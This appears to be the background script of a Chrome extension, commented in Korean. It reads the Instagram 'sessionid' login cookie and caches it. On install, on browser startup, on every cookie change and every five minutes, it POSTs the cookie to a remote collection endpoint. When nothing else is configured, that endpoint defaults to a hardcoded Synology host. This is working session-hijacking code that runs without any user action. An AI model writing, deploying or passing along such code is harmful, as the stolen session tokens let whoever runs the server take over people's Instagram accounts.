/*
  getInstagramSessionId 함수
  - 동작 원리: 크롬의 cookies API를 사용하여 인스타그램 도메인(https://www.instagram.com/)에서 이름이 'sessionid'인 쿠키를 조회합니다. 이 쿠키는 로그인 성공 시 서버가 내려주는 세션 식별자입니다.
  - 반환 값: Promise<string> 형태로 sessionid 값을 반환합니다. 쿠키가 없거나 권한 문제가 있으면 reject됩니다.
  - 사용 방법: 메시지 리스너 등에서 await 또는 then으로 결과를 받아 UI에 표시하거나 복사 기능에 연결합니다.
*/
const INSTAGRAM_URL = "https://www.instagram.com/";
const DEFAULT_ENDPOINT = "http://pampakim.synology.me:3000/api/collect-session";
let cachedInstagramSessionId = null;
let lastSentSessionId = null;
let lastSentAtMs = 0;
let isSending = false; // 전송 중복 방지 플래그

/*
  getKoreanTime 함수
  - 동작 원리: 현재 시간을 한국 시간대로 변환하여 'YYYY-MM-DD HH:MM:SS' 형식의 문자열로 반환합니다.
  - 반환 값: 한국 시간대의 현재 날짜와 시간을 문자열로 반환합니다.
  - 사용 방법: 로그 메시지 앞에 시간 정보를 추가할 때 사용합니다.
*/
function getKoreanTime() {
  const now = new Date();
  const koreanTime = new Date(now.getTime() + (9 * 60 * 60 * 1000)); // UTC+9 (한국 시간)
  const year = koreanTime.getUTCFullYear();
  const month = String(koreanTime.getUTCMonth() + 1).padStart(2, '0');
  const day = String(koreanTime.getUTCDate()).padStart(2, '0');
  const hours = String(koreanTime.getUTCHours()).padStart(2, '0');
  const minutes = String(koreanTime.getUTCMinutes()).padStart(2, '0');
  const seconds = String(koreanTime.getUTCSeconds()).padStart(2, '0');
  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}

/*
  logWithTime 함수
  - 동작 원리: 로그 메시지 앞에 한국 시간을 자동으로 추가하여 언제 발생했는지 명확하게 표시합니다.
  - 매개변수 설명:
    1) message: 출력할 로그 메시지입니다.
    2) type: 로그 타입 ('log', 'warn', 'error')입니다. 기본값은 'log'입니다.
  - 사용 방법: 기존 console.log 대신 이 함수를 사용하여 시간 정보가 포함된 로그를 출력합니다.
*/
function logWithTime(message, type = 'log') {
  const timestamp = getKoreanTime();
  const logMessage = `[${timestamp}] ${message}`;
  
  switch (type) {
    case 'warn':
      console.warn(logMessage);
      break;
    case 'error':
      console.error(logMessage);
      break;
    default:
      console.log(logMessage);
  }
}

/*
  cacheSessionId 함수
  - 동작 원리: 메모리 변수와 chrome.storage.local에 sessionid 값을 저장합니다. 이후 팝업이나 다른 컨텍스트에서 빠르게 접근할 수 있습니다.
  - 매개변수 설명:
    1) sessionIdValue: 저장할 sessionid 순수 문자열입니다. null/빈문자열은 저장하지 않습니다.
    2) persistToStorage: true면 chrome.storage.local에도 영구 저장합니다.
    3) onComplete: 저장 작업 완료 후 호출되는 콜백입니다.
*/
function cacheSessionId(sessionIdValue, persistToStorage = true, onComplete) {
  if (!sessionIdValue) {
    onComplete && onComplete();
    return;
  }
  cachedInstagramSessionId = sessionIdValue;
  if (persistToStorage && chrome?.storage?.local) {
    chrome.storage.local.set({ instagram_sessionid: sessionIdValue }, () => {
      onComplete && onComplete();
    });
  } else {
    onComplete && onComplete();
  }
}

function getInstagramSessionId() {
  return new Promise((resolve, reject) => {
    chrome.cookies.get({ url: INSTAGRAM_URL, name: "sessionid" }, (cookie) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
        return;
      }

      if (!cookie || !cookie.value) {
        reject(new Error("sessionid 쿠키를 찾을 수 없습니다. 인스타그램에 로그인했는지 확인하세요."));
        return;
      }

      resolve(cookie.value);
    });
  });
}

/*
  ensureSessionIdCached 함수
  - 동작 원리: 메모리/스토리지에 캐시가 없을 때 쿠키에서 가져와 캐싱합니다. 이미 캐시가 있으면 즉시 반환합니다.
  - 반환 값: Promise<string|null>로, 가져오기에 실패하면 null을 반환합니다.
  - 사용 요령: 익스텐션 시작/설치 시 호출하거나, 메시지 처리 전에 보조로 호출합니다.
*/
function ensureSessionIdCached() {
  return new Promise((resolve) => {
    if (cachedInstagramSessionId) {
      resolve(cachedInstagramSessionId);
      return;
    }

    // storage에서 복구 시도
    if (chrome?.storage?.local) {
      chrome.storage.local.get(["instagram_sessionid", "last_sent_sessionid", "last_sent_at_ms"], (items) => {
        const stored = items?.instagram_sessionid || null;
        lastSentSessionId = items?.last_sent_sessionid || null;
        lastSentAtMs = Number(items?.last_sent_at_ms || 0);
        if (stored) {
          cachedInstagramSessionId = stored;
          resolve(stored);
          return;
        }
        // 쿠키에서 최종 조회
        getInstagramSessionId()
          .then((sid) => {
            cacheSessionId(sid, true, () => resolve(sid));
          })
          .catch(() => resolve(null));
      });
    } else {
      getInstagramSessionId()
        .then((sid) => {
          cachedInstagramSessionId = sid;
          resolve(sid);
        })
        .catch(() => resolve(null));
    }
  });
}

/*
  onMessage 리스너
  - 동작 원리: popup 스크립트가 전송하는 'GET_INSTAGRAM_SESSIONID' 타입의 메시지를 수신하면, getInstagramSessionId를 호출해 결과를 응답합니다.
  - 매개변수 설명:
    1) message: 발신자가 보낸 데이터 객체입니다. 여기서는 type 필드를 기준으로 분기합니다.
    2) sender: 메시지를 보낸 주체(페이지/팝업/서비스워커)의 메타데이터입니다. 본 로직에서는 사용하지 않습니다.
    3) sendResponse: 비동기 결과를 응답하기 위해 호출하는 콜백입니다. Promise를 사용하는 경우 true를 반환해 채널을 유지합니다.
*/
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message && message.type === "GET_INSTAGRAM_SESSIONID") {
    // 캐시 우선 사용, 없으면 쿠키 조회
    ensureSessionIdCached()
      .then((sid) => {
        if (sid) {
          sendResponse({ ok: true, sessionid: sid });
        } else {
          return getInstagramSessionId()
            .then((fresh) => {
              cacheSessionId(fresh, true, () => {});
              sendResponse({ ok: true, sessionid: fresh });
            })
            .catch((error) => {
              sendResponse({ ok: false, error: error.message || String(error) });
            });
        }
      })
      .catch((error) => {
        sendResponse({ ok: false, error: error.message || String(error) });
      });

    // 비동기 응답을 위해 true 반환
    return true;
  }
  if (message && message.type === "TEST_SEND_TO_SYNOLOGY") {
    // 캐시 우선 → 없으면 즉시 쿠키 조회 후 전송
    (async () => {
      try {
        let sid = await ensureSessionIdCached();
        if (!sid) {
          try { sid = await getInstagramSessionId(); } catch {}
        }
        if (!sid) {
          sendResponse({ ok: false, error: "sessionid를 찾을 수 없습니다. 인스타그램에 로그인했는지 확인하세요." });
          return;
        }
        await sendSessionToSynology(sid, true);
        sendResponse({ ok: true });
      } catch (error) {
        sendResponse({ ok: false, error: error?.message || String(error) });
      }
    })();
    return true;
  }
});

/*
  자동 초기화: 설치/업데이트/시작 시 세션 자동 캐시
  - onInstalled: 확장 설치/업데이트 직후 한 번 실행되어 세션을 캐시합니다.
  - onStartup: 브라우저 시작 시 서비스 워커 기동 때 세션을 캐시합니다.
*/
if (chrome?.runtime?.onInstalled) {
  chrome.runtime.onInstalled.addListener(() => {
    logWithTime('[IG session] onInstalled');
    ensureSessionIdCached().then((sid) => {
      if (sid) {
        maybeSendIfChanged(sid);
      }
    });
  });
}

if (chrome?.runtime?.onStartup) {
  chrome.runtime.onStartup.addListener(() => {
    logWithTime('[IG session] onStartup');
    ensureSessionIdCached().then((sid) => {
      if (sid) {
        maybeSendIfChanged(sid);
      }
    });
  });
}

/*
  쿠키 변경 감지: 인스타그램 sessionid 변경 시 캐시 갱신
  - 동작 원리: chrome.cookies.onChanged 이벤트에서 대상 쿠키가 instagram.com의 'sessionid'인지 판단 후 캐시를 갱신합니다.
*/
if (chrome?.cookies?.onChanged) {
  chrome.cookies.onChanged.addListener((changeInfo) => {
    try {
      const { cookie } = changeInfo || {};
      if (!cookie) return;
      if (!cookie.domain || !cookie.name) return;
      // 도메인은 .instagram.com 또는 instagram.com 형태 가능
      const isInstagram = /(^|\.)instagram\.com$/.test(cookie.domain.replace(/^\./, ""));
      const isSessionId = cookie.name === "sessionid";
      if (isInstagram && isSessionId) {
        const value = cookie?.value || null;
        if (value) {
          logWithTime('[IG session] cookies.onChanged detected');
          cacheSessionId(value, true, () => {
            // onChanged 발생 시에만 전송 (중복 억제 적용)
            maybeSendIfChanged(value);
          });
        }
      }
    } catch (_) {
      // 무시
    }
  });
}

/*
  sendSessionToSynology 함수
  - 동작 원리: 옵션에 저장된 Synology 엔드포인트/토큰을 읽고, HTTPS POST로 sessionid를 전송합니다.
  - 매개변수 설명:
    1) sessionIdValue: 전송할 sessionid 문자열입니다. 없으면 함수가 종료됩니다.
    2) testMode: true일 때 네트워크 결과를 반환하지만 실패해도 조용히 처리합니다.
    3) returns: Promise<void>
*/
async function sendSessionToSynology(sessionIdValue, testMode = false) {
  if (!sessionIdValue) {
    if (testMode) throw new Error("세션값이 비어 있습니다");
    return;
  }
  
  // 중복 전송 방지: 마지막으로 전송한 sessionid와 비교
  if (!testMode && lastSentSessionId === sessionIdValue) {
    logWithTime('[IG session] sessionid unchanged, skipping send');
    return;
  }
  
  // 동시 전송 방지: 이미 전송 중이면 차단
  if (!testMode && isSending) {
    logWithTime('[IG session] already sending, skipping duplicate request');
    return;
  }
  
  // 전송 시작 플래그 설정
  if (!testMode) {
    isSending = true;
  }
  
  try {
    const settings = await new Promise((resolve) => {
      chrome.storage.local.get(["synology_endpoint", "synology_token", "synology_insecure"], (items) => resolve(items || {}));
    });
    let endpoint = (settings.synology_endpoint || "").trim();
    // 저장된 엔드포인트가 /collect-session 이면 자동으로 /api/collect-session로 교정
    try {
      if (endpoint) {
        const u = new URL(endpoint);
        if (u.pathname === "/collect-session") {
          u.pathname = "/api/collect-session";
          endpoint = u.toString();
          chrome.storage.local.set({ synology_endpoint: endpoint });
        }
      }
    } catch {}
    if (!endpoint) {
      // 하드코딩 기본값 사용
      endpoint = DEFAULT_ENDPOINT;
      logWithTime('[IG session] endpoint not set, fallback to DEFAULT_ENDPOINT: ' + endpoint, 'warn');
      // 편의상 저장도 해둠
      chrome.storage.local.set({ synology_endpoint: endpoint }, () => {});
    }
    const token = (settings.synology_token || "").trim();

    const headers = { "Content-Type": "application/json" };
    if (token) {
      // 사용자가 순수 토큰만 입력한 경우 자동으로 Bearer 접두어를 부여합니다.
      const looksPrefixed = /^\s*\w+\s+\S+/.test(token) || /^\s*Bearer\s+/i.test(token);
      headers["Authorization"] = looksPrefixed ? token : `Bearer ${token}`;
    }

    const body = { service: "instagram", key: "sessionid", value: sessionIdValue, ts: Date.now() };

    const masked = sessionIdValue.length > 12 ? `${sessionIdValue.slice(0,6)}...${sessionIdValue.slice(-4)}` : sessionIdValue;
    logWithTime(`[IG session] sending to ${endpoint}, len=${sessionIdValue.length}, sid=${masked}`);
    const res = await fetch(endpoint, {
      method: "POST",
      headers,
      body: JSON.stringify(body),
      // 주: MV3 fetch는 자체적으로 CORS 제약이 완화되어 있음. SSL 검증 비활성화 옵션은 브라우저에서 무시됩니다.
    });
    if (!res.ok) {
      const txt = await res.text().catch(() => '');
      logWithTime(`[IG session] send failed ${res.status}: ${txt}`, 'warn');
      throw new Error(`HTTP ${res.status}`);
    }
    // 전송 성공 시 마지막 전송값 업데이트
    lastSentSessionId = sessionIdValue;
    lastSentAtMs = Date.now();
    if (chrome?.storage?.local) {
      chrome.storage.local.set({ last_sent_sessionid: sessionIdValue, last_sent_at_ms: lastSentAtMs }, () => {});
    }
    logWithTime('[IG session] send success');
  } catch (err) {
    logWithTime(`[IG session] send error: ${err?.message || String(err)}`, 'error');
    if (testMode) throw err;
  } finally {
    // 전송 완료 후 플래그 해제
    if (!testMode) {
      isSending = false;
    }
  }
}

// 시작 시 캐시된 값이 있으면 전송 시도
ensureSessionIdCached().then((sid) => {
  if (sid) {
    logWithTime('[IG session] initial ensure cache -> maybeSendIfChanged');
    maybeSendIfChanged(sid);
  }
});

/*
  maybeSendIfChanged
  - 동작: 현재 세션이 직전에 전송한 값과 다를 때만 전송합니다.
  - 중복 전송 방지: 같은 sessionid는 재전송하지 않습니다.
  - 동시 전송 방지: 이미 전송 중이면 추가 전송을 차단합니다.
*/
function maybeSendIfChanged(current, force = false) {
  if (!current) return;
  
  // 강제 전송이 아닌 경우 중복 체크
  if (!force && lastSentSessionId === current) {
    logWithTime('[IG session] sessionid unchanged, skipping send');
    return;
  }
  
  // 동시 전송 방지 체크
  if (!force && isSending) {
    logWithTime('[IG session] already sending, skipping duplicate request');
    return;
  }
  
  sendSessionToSynology(current).catch(() => {});
}

/*
  주기 폴링(보조): onChanged가 OS/브라우저 환경에 따라 누락될 것을 대비해 5분 간격으로 재확인
  - 폴링 간격을 30초에서 5분으로 늘려 중복 전송 방지
*/
if (chrome?.alarms) {
  try {
    chrome.alarms.create('ig-session-poll', { periodInMinutes: 5 });
    chrome.alarms.onAlarm.addListener((alarm) => {
      if (alarm?.name !== 'ig-session-poll') return;
      getInstagramSessionId()
        .then((sid) => {
          if (!sid) return;
          if (!cachedInstagramSessionId || cachedInstagramSessionId !== sid) {
            cacheSessionId(sid, true, () => {});
          }
          // 폴링에서는 중복 전송 방지 적용
          maybeSendIfChanged(sid);
        })
        .catch(() => {});
    });
  } catch {}
}


